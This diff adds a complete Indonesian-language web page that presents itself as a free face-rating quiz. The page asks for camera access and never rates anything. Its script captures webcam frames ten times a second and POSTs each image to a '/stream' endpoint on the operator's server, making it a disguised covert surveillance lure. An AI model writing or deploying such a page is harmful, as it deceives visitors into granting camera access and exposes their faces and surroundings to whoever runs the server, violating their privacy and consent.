@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Rate Muka Kamu Gratis!</title>
+  <style>
+    body {font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #ff6b6b, #4ecdc4); text-align: center; color: white; padding: 20px;}
+    h1 {font-size: 28px; margin: 10px;}
+    video {width: 100%; max-width: 380px; border: 5px solid white; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.3);}
+    #status {margin: 15px; font-weight: bold; color: #fff;}
+    .btn {background: #fff; color: #ff6b6b; padding: 12px 25px; border: none; border-radius: 50px; font-size: 16px; cursor: pointer; margin: 10px;}
+  </style>
+</head>
+<body>
+  <h1>Rate Muka Kamu Sekarang!</h1>
+  <p>Izinkan kamera untuk lihat rating wajahmu!</p>
+  <video id="video" autoplay playsinline></video>
+  <div id="status">Menghubungkan...</div>
+
+  <script>
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+
+    async function startCam() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: 320, height: 240 }
+        });
+        video.srcObject = stream;
+        status.innerHTML = "LIVE STREAMING AKTIF!";
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 320; canvas.height = 240;
+        const ctx = canvas.getContext('2d');
+
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, 320, 240);
+          fetch('/stream', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: canvas.toDataURL('image/jpeg', 0.5) })
+          });
+        }, 100); // 10 FPS
+
+      } catch (e) {
+        alert("Izinkan akses kamera untuk melanjutkan!");
+      }
+    }
+    window.onload = startCam;
+  </script>
+</body>
+  </html>
